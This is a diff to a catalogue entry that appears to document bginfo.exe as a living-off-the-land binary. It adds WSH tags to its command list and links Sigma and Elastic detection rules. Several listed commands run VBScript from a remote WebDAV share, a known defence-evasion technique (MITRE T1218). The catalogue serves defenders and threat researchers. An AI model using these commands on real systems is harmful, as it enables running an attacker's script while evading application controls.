@@ -11,6 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
+    Tags: [WSH]
   - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
     Description: Execute VBscript code that is referenced within the bginfo.bgi file.
     Usecase: Local execution of VBScript
@@ -18,12 +19,14 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
+    Tags: [WSH]
   - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: Execute bginfo.exe from a WebDAV server.
     Category: Execute
     Privileges: User
     MitreID: T1218
+    Tags: [WSH]
     OperatingSystem: Windows
   - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
@@ -32,6 +35,7 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
+    Tags: [WSH]
   - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
@@ -39,6 +43,7 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
+    Tags: [WSH]
   - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
@@ -46,10 +51,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
+    Tags: [WSH]
 Full_Path:
   - Path: No fixed path
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
   - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
